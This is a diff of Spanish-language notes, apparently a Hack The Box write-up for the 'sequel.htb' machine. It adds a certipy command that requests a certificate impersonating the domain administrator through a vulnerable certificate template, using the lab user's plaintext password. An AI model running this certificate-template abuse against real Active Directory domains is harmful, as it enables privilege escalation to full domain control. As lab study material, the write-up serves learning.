@@ -195,5 +195,10 @@ en este punto podemos utilizar la herramienta certify para intentar buscar algú
 esto nos permite identificar las plantillas vulnerables. esta vulnerabilidad se puede explotar usando la herramienta certipy
 ![[Pasted image 20240329160548.png]]
 
-### certypy-ad
+### certipy-ad
 
+
+```python
+certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
+```
+![[Pasted image 20240329163011.png]]
